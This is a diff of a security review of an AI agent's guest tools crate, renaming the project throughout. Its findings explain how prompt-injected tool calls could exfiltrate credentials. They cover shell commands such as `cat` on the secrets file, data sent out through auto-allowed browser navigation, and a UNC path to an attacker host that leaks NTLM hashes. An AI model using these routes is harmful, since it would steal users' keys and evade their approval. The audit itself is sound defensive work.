@@ -1,20 +1,20 @@
 # Guest & Tools — review
 
-**Reviewed:** every line of `crates/openbot-guest/` — `src/tools.rs` (1121), `src/browser.rs` (944),
+**Reviewed:** every line of `crates/botroster-guest/` — `src/tools.rs` (1121), `src/browser.rs` (944),
 `src/client.rs` (338), `src/main.rs` (223), `src/lib.rs` (143) — plus its four test files
 (`browser.rs`, `isolation.rs`, `refused.rs`, `shell_timeout.rs`, 1089 lines). Read for context:
 `CLAUDE.md`, `CONTRIBUTING.md`, `docs/SPEC.md` headings, and, to check what the shipped defaults
-actually are, `crates/openbotd/src/policy.rs:118-181`, `crates/openbot-cli/src/up.rs:270-340`,
-`crates/openbot-cli/src/config.rs:70-90`. No browser was launched and no test suite was run.
+actually are, `crates/botrosterd/src/policy.rs:118-181`, `crates/botroster-cli/src/up.rs:270-340`,
+`crates/botroster-cli/src/config.rs:70-90`. No browser was launched and no test suite was run.
 
 **Verdict:** The filesystem confinement is the most carefully-built thing in the crate — the
 dangling-symlink walk in `Workspace::resolve` is genuinely correct where most implementations are
 not — and it is also the wrong place to have spent that care, because `shell.exec` sits beside it
-reading `~/.openbot/secrets.json` in one command and the crate's own module doc still claims
+reading `~/.botroster/secrets.json` in one command and the crate's own module doc still claims
 "everything it can reach on the filesystem is bounded by `tools::Workspace`" (`src/lib.rs:5`). The
 containment story is weakest exactly where the project believes it is strongest: `isolation.rs`
-proves no *crate* edge to `openbotd` and then panics with "this is the reason a prompt injection
-cannot exfiltrate a credential", while `openbot up` runs hub, secret store and guest in one process
+proves no *crate* edge to `botrosterd` and then panics with "this is the reason a prompt injection
+cannot exfiltrate a credential", while `botroster up` runs hub, secret store and guest in one process
 whose environment every `shell.exec` child inherits. On the product side, the browser driver is a
 real differentiator in ambition and not yet in capability: it drives one tab of one browser with no
 tabs, no iframes, no uploads, no downloads, no dialog handling and no way to wait for anything, and
@@ -26,7 +26,7 @@ nothing to do with the model.
 ## Findings
 
 ### F-GT1 — `shell.exec` reads the credentials the isolation invariant exists to protect
-`P0` · `reach: all users` · `crates/openbot-guest/src/tools.rs:637-667`
+`P0` · `reach: all users` · `crates/botroster-guest/src/tools.rs:637-667`
 
 **What is true now.** `shell.exec` builds `sh -lc <command>` (or `cmd /C`), sets
 `current_dir(ws.root())`, and spawns it. `current_dir` is the only confinement applied: the command
@@ -34,17 +34,17 @@ string is arbitrary and the child runs as the user with the parent's full enviro
 `tokio::process::Command` inherits it and nothing here calls `.env_clear()` or `.env_remove()`.
 
 Two concrete reachable secrets, and the model provider key is reachable by whichever route the
-install used. `resolve_key` (`crates/openbot-cli/src/config.rs:346-363`) tries
-`std::env::var("XAI_API_KEY")` first and falls back to the secret store. `openbot up` starts the
-hub, the secret store and the guest in a single process (`crates/openbot-cli/src/up.rs:275-325` —
-`hub_from_home` then `tokio::spawn(openbot_guest::run_supervised(...))`), so on an install that
+install used. `resolve_key` (`crates/botroster-cli/src/config.rs:346-363`) tries
+`std::env::var("XAI_API_KEY")` first and falls back to the secret store. `botroster up` starts the
+hub, the secret store and the guest in a single process (`crates/botroster-cli/src/up.rs:275-325` —
+`hub_from_home` then `tokio::spawn(botroster_guest::run_supervised(...))`), so on an install that
 exported the variable — the documented primary path — the shell child inherits it and `env` prints
 it. On an install that stored the key instead, the credential store is a mode-0600 file owned by the
-same user at `home/secrets.json` (`crates/openbotd/src/secrets.rs:111`), and
-`cat ~/.openbot/secrets.json` reads it. There is no configuration in which neither works.
+same user at `home/secrets.json` (`crates/botrosterd/src/secrets.rs:111`), and
+`cat ~/.botroster/secrets.json` reads it. There is no configuration in which neither works.
 
-`crates/openbot-guest/tests/isolation.rs:118-131` panics with: *"the guest can now reach the
-credential store… `openbotd::secrets` holds the tokens in plaintext, and the guest is the side that
+`crates/botroster-guest/tests/isolation.rs:118-131` panics with: *"the guest can now reach the
+credential store… `botrosterd::secrets` holds the tokens in plaintext, and the guest is the side that
 runs model-chosen tool calls against untrusted pages. Keeping those apart is not a convention; it is
 the reason a prompt injection cannot exfiltrate a credential."* That stated purpose is not achieved.
 The test proves a property of `Cargo.toml`, not of the guest.
@@ -60,10 +60,10 @@ whatever the login profile exports, and a profile containing a `cd` moves the co
 the captured `stdout` the model parses.
 
 **Why it matters.** This is where a prompt injection cashes out. `shell.exec` is `ask` in the
-shipped policy (`crates/openbotd/src/policy.rs:130`), so there is a human in the loop — but the
+shipped policy (`crates/botrosterd/src/policy.rs:130`), so there is a human in the loop — but the
 approval card shows a command, and a person approving `npm test` or `cargo build` is not approving
 the postinstall script that reads `secrets.json`. `Rule::allow("shell.exec")` is a documented
-configuration (`crates/openbot-cli/src/config.rs:696`), and on that account the chain is silent.
+configuration (`crates/botroster-cli/src/config.rs:696`), and on that account the chain is silent.
 The gap between what `isolation.rs` promises and what ships is the problem: a reviewer who reads
 that test believes the boundary holds.
 
@@ -71,7 +71,7 @@ that test believes the boundary holds.
 structural moves, in order of what they buy: (1) `shell.exec` clears the environment and
 reconstructs a minimal allowlist (`PATH`, `HOME`, `LANG`, `TERM`) rather than inheriting — this is
 one call and closes the env half completely; (2) the guest runs as a different OS user, or in its
-own process with the secret store unreadable to it, so that `openbot up` stops being a single
+own process with the secret store unreadable to it, so that `botroster up` stops being a single
 process where the shell child is a sibling of the tokens. Until (2), `isolation.rs`'s panic message
 should be rewritten to claim only what it proves, and `src/lib.rs:5` ("Everything it can reach on
 the filesystem is bounded by `tools::Workspace`") is false as written and should say "`fs.*` is
@@ -91,7 +91,7 @@ the bearer crossing the network in the clear — is bypassed by a registrable ho
 `src/main.rs:203-222` only exercise the happy path. Parse the URL and test the host, not the string.
 
 ### F-GT2 — Chrome runs with `--no-sandbox`, justified by a comment claiming isolation the project says it does not have
-`P0` · `reach: all users` · `crates/openbot-guest/src/browser.rs:200-203`
+`P0` · `reach: all users` · `crates/botroster-guest/src/browser.rs:200-203`
 
 **What is true now.** The browser is launched with `--no-sandbox`, unconditionally, under the
 comment *"The guest is already a sandbox; Chrome's own sandbox needs privileges a container usually
@@ -102,7 +102,7 @@ comments or UI copy that implies isolation the project does not have."*
 **Why it matters.** The renderer sandbox is the last boundary between a malicious web page and the
 user's account, and this product's entire purpose is to point that renderer at pages chosen by an
 adversary-influenced model. With `--no-sandbox`, a renderer exploit executes as the user, next to
-`~/.ssh` and `~/.openbot/secrets.json`, with nothing behind it. The comment is not just wrong copy —
+`~/.ssh` and `~/.botroster/secrets.json`, with nothing behind it. The comment is not just wrong copy —
 it is the reasoning that made the flag look safe to add, so the copy and the defect are the same
 thing. It also survives review precisely because it reads like a considered decision.
 
@@ -110,7 +110,7 @@ thing. It also survives review precisely because it reads like a considered deci
 say why at the call site. The real constraint is narrow — Chrome refuses to start as UID 0, and some
 container configurations lack `CLONE_NEWUSER` — so the flag belongs behind a detection (running as
 root, or a launch that failed with the sandbox error and is being retried once) or behind an
-explicit `OPENBOT_BROWSER_NO_SANDBOX` opt-in that logs a warning, not in the unconditional argument
+explicit `BOTROSTER_BROWSER_NO_SANDBOX` opt-in that logs a warning, not in the unconditional argument
 list. Delete the comment either way.
 
 **How to prove it.** A test that reads back the launch arguments (or the `chrome://version` command
@@ -120,12 +120,12 @@ today on every platform. The CLAUDE.md rule additionally deserves a grep-based t
 second-order failure: the rule exists and nothing enforces it.
 
 ### F-GT3 — the allow-listed tools are larger primitives than their approval implies
-`P0` · `reach: all users` · `crates/openbot-guest/src/tools.rs:462-470`, `:584-597`
+`P0` · `reach: all users` · `crates/botroster-guest/src/tools.rs:462-470`, `:584-597`
 
 **What is true now.** `browser.open` accepts any `http://` or `https://` URL. The scheme check is
 the only check: no host allowlist, no distinction between "navigate within the site I am working on"
 and "make an arbitrary outbound request with data in the query string". In the shipped default
-policy it is `Rule::allow("browser.open")` (`crates/openbotd/src/policy.rs:132`), alongside
+policy it is `Rule::allow("browser.open")` (`crates/botrosterd/src/policy.rs:132`), alongside
 `Rule::allow("fs.read")` and `Rule::allow("browser.read")`, under the comment "Reading the web is
 browsing".
 
@@ -164,7 +164,7 @@ today. And `browser.screenshot` onto a path holding existing bytes leaves them i
 today.
 
 ### F-GT4 — the model can act on the page but has no way to see what it can act on
-`P0` · `reach: most users` · `crates/openbot-guest/src/browser.rs:394-407`
+`P0` · `reach: most users` · `crates/botroster-guest/src/browser.rs:394-407`
 
 **What is true now.** `browser.read` returns `document.body.innerText`, capped at 20 000 bytes
 (`tools.rs:481-489`). `browser.links` returns up to 200 `{text, href}` pairs — `.slice(0,200)` at
@@ -206,7 +206,7 @@ snapshot does not exist, so the test cannot even be written against the current 
 the finding.
 
 ### F-GT5 — a click that navigates returns stale state, or a spurious error
-`P1` · `reach: most users` · `crates/openbot-guest/src/tools.rs:500-511`
+`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:500-511`
 
 **What is true now.** `browser.click` calls `b.click(&sel)` — a `Runtime.evaluate` of
 `e.click()` (`browser.rs:409-418`) — and then immediately calls `b.info()`, a second
@@ -243,7 +243,7 @@ assert the returned `url` is the second page's. It is the first page's, or an er
 test on a fixture that navigates after a 300 ms timer asserts the same.
 
 ### F-GT6 — the input tools report success they did not achieve
-`P1` · `reach: most users` · `crates/openbot-guest/src/browser.rs:420-435`
+`P1` · `reach: most users` · `crates/botroster-guest/src/browser.rs:420-435`
 
 **What is true now.** `fill` runs `e.focus(); e.value=<text>; dispatchEvent(input); dispatchEvent(change)`
 and returns `'ok'` whenever `querySelector` found *anything*. On a `contenteditable` div, a custom
@@ -281,7 +281,7 @@ success. `click` on a `disabled` button returns an error — it returns `ok` tod
 field whose `keydown` handler records `e.keyCode` records a non-zero code — it records 0 today.
 
 ### F-GT7 — a JavaScript dialog has no handler anywhere in the crate, and no test
-`P1` · `reach: most users` · `crates/openbot-guest/src/browser.rs:279`
+`P1` · `reach: most users` · `crates/botroster-guest/src/browser.rs:279`
 
 **What is true now.** `attach` enables the Page domain (`Page.enable`, `browser.rs:279`). A grep of
 the entire crate for `handleJavaScriptDialog` and `javascriptDialog` returns nothing, and the live
@@ -320,7 +320,7 @@ either hangs to the 60 s timeout or it does not — and either way the test does
 behaviour is unknown to the project.
 
 ### F-GT8 — one browser, one tab, shared by every Bot and every concurrent tool call
-`P1` · `reach: most users` · `crates/openbot-guest/src/tools.rs:66-84`
+`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:66-84`
 
 **What is true now.** `Context` holds a single browser (`tools.rs:46-54`), and one `Context` is
 shared by the whole guest — `Arc::new(Context::new(...))` at `up.rs:314` and `main.rs:154`.
@@ -353,7 +353,7 @@ two sessions, navigates each to a different URL concurrently, and asserts each s
 `browser.info` reports its own URL; today both report whichever landed last.
 
 ### F-GT9 — the filesystem tools cannot handle a file or directory of ordinary size
-`P1` · `reach: most users` · `crates/openbot-guest/src/tools.rs:616-635`
+`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:616-635`
 
 **What is true now.** `fs.read` takes a `path` and nothing else: no offset, no length, no line
 range. It calls `std::fs::read` — the *entire* file into memory — decodes it, and then truncates to
@@ -391,7 +391,7 @@ every byte — impossible today. Assert `fs.list` on a directory of 50 000 entri
 payload with `truncated: true` — it returns all 50 000 today.
 
 ### F-GT10 — `shell.exec` has an unbounded output buffer, an unbounded timeout, and no cancel path
-`P1` · `reach: some users` · `crates/openbot-guest/src/tools.rs:669-686`
+`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:669-686`
 
 **What is true now.** Three compounding gaps in one tool.
 
@@ -400,7 +400,7 @@ applied afterwards, to the already-complete `String`. The doc comment at `tools.
 `OUTPUT_BYTE_LIMIT` as a cap on "captured process output… rather than returning a payload large
 enough to blow a context window", which reads as a bound on capture and is only a bound on
 presentation. A command that writes fast and long (`yes`, a runaway build, a `cat` of a large
-binary) grows the buffer until the process dies — and under `openbot up` that process is also the
+binary) grows the buffer until the process dies — and under `botroster up` that process is also the
 hub and the desktop app.
 
 *Timeout.* `timeout_secs` is taken with `as_u64()` and passed straight to `Duration::from_secs`
@@ -410,7 +410,7 @@ unbounded command.
 
 *Cancellation.* There is none. `handle_notification` handles only `SessionUnbind` and logs the rest
 at debug (`client.rs:211-218`), though `Method::ToolCancel` exists in the protocol
-(`openbot-proto/src/lib.rs:243`). `run_tool` is spawned with its `JoinHandle` dropped
+(`botroster-proto/src/lib.rs:243`). `run_tool` is spawned with its `JoinHandle` dropped
 (`client.rs:260-262`), so nothing holds a way to abort it. And when the hub socket drops, `run`
 returns and `run_supervised` reconnects (`client.rs:176-208`, `:91-122`) while every in-flight tool
 task keeps running against a dead channel — which matches the symptom already recorded in
@@ -435,7 +435,7 @@ rejected or clamped to 3600 — it is honoured today. And a cancel arriving mid-
 path exists today.
 
 ### F-GT11 — a timed-out command's children survive, and the test that guards it cannot see them
-`P1` · `reach: some users` · `crates/openbot-guest/src/tools.rs:660-667`
+`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:660-667`
 
 **What is true now.** `kill_on_drop(true)` reaps the shell the guest spawned, and the comment at
 `tools.rs:663-666` says so honestly: *"A grandchild the shell spawned and detached can still outlive
@@ -469,7 +469,7 @@ Windows — and assert the marker never appears. It appears today, which is the 
 current test makes and cannot reach.
 
 ### F-GT12 — the escape check touches the filesystem before rejecting, and reports every I/O error as an escape
-`P1` · `reach: some users` · `crates/openbot-guest/src/tools.rs:230-243`
+`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:230-243`
 
 **What is true now.** `resolve` collapses `..` lexically, and then — *before* any comparison against
 the root — walks the path calling `std::fs::symlink_metadata` on each ancestor and finally
@@ -481,7 +481,7 @@ Two consequences.
 (`\\attacker.example\share\x`) is `is_absolute`, so `symlink_metadata` reaches out over SMB — and
 Windows will attempt NTLM authentication to that host, leaking the user's NTLMv2 hash, before
 `resolve` returns `Escape`. `fs.read` is `Rule::allow` in the shipped policy
-(`crates/openbotd/src/policy.rs:127`), so this needs no approval; the model sees only "path escapes
+(`crates/botrosterd/src/policy.rs:127`), so this needs no approval; the model sees only "path escapes
 the workspace" and has no idea anything left the machine. The same shape is a hang on any path on a
 dead network mount or an unresponsive autofs, in a blocking call on the async runtime.
 
@@ -556,7 +556,7 @@ severe first; several are the missing halves of findings above.
   check: whether `--headless=new` holds a dialog for the client or auto-dismisses it (F-GT7); which
   of the three race outcomes `browser.click` produces in practice (F-GT5); and whether
   `Runtime.evaluate`'s `innerText` picks up shadow-DOM content, which would slightly narrow F-GT4.
-- **No test suite was run** (`cargo check -p openbot-guest` was permitted but not needed for any
+- **No test suite was run** (`cargo check -p botroster-guest` was permitted but not needed for any
   finding; nothing here rests on compilation behaviour). The 20 live browser tests in
   `tests/browser.rs` were read, not executed, so I am reporting what they assert, not that they pass.
 - **Windows-specific behaviours are reasoned, not measured**: the UNC/NTLM reach in F-GT12, 8.3 short
@@ -566,8 +566,8 @@ severe first; several are the missing halves of findings above.
   refused by the root check — but neither is covered by a test. The reserved-device-name canary at
   `tools.rs:1085-1120` covers `CON`/`NUL`/`COM1` and documents itself as asserting a property of the
   platform rather than of `resolve`, which I agree with.
-- **Out of scope, read only far enough to check a claim**: `openbotd`'s policy engine beyond
-  `Default` (`policy.rs:118-181`), the approval-card rendering, and how `openbot-agent` surfaces a
+- **Out of scope, read only far enough to check a claim**: `botrosterd`'s policy engine beyond
+  `Default` (`policy.rs:118-181`), the approval-card rendering, and how `botroster-agent` surfaces a
   `ToolError` string to the model. "Error quality" in this report is therefore judged at the guest's
   boundary — the message the hub receives — not as the model finally sees it.
 - **TOCTOU between `resolve` and the open** is real (the resolved path is re-opened, not held) but I
